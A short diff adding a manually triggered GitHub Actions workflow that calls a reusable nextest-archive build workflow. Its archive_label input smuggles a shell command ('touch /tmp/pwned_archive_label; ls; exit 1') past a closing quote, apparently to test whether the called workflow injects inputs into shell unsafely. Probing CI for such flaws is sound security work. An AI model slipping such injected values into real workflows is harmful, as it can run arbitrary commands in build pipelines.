@@ -1,0 +1,11 @@
+name: argus-call-46
+on:
+  workflow_dispatch:
+jobs:
+  call:
+    uses: ./.github/workflows/build-nextest-archives.yml
+    with:
+      cargo_profile: "x"
+      timeout_minutes: "1"
+      archive_label: "x\"; touch /tmp/pwned_archive_label; ls; exit 1; #"
+      target_group: "x"
